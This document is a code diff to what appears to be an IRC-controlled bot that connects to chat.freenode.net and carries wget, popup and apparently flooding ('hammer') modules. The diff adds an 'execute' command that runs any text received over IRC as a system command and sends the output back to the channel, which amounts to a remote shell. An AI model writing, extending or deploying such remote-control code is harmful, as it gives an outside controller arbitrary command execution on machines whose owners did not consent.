@@ -19,6 +19,7 @@ from modules import wget
 from modules import info
 from modules import popup
 from modules import hammer
+from modules import execute
 
 SERVER = "chat.freenode.net"
 TARGET = None
@@ -111,6 +112,18 @@ def run(msg, priv=False):
 		else:
 			send("PRIVMSG %s :%s"%(receiver, wget.usage))
 
+	elif message[0] == "execute":
+		if len(message) > 1:
+			if message[1] == "help":
+				result = execute.usage
+			else:
+				command = ' '.join(message[1:])
+				result  = execute.run(command)
+		else:
+			result = execute.usage
+
+		send("PRIVMSG %s :%s"%(receiver, result))
+	
 	else:
 		pass
 
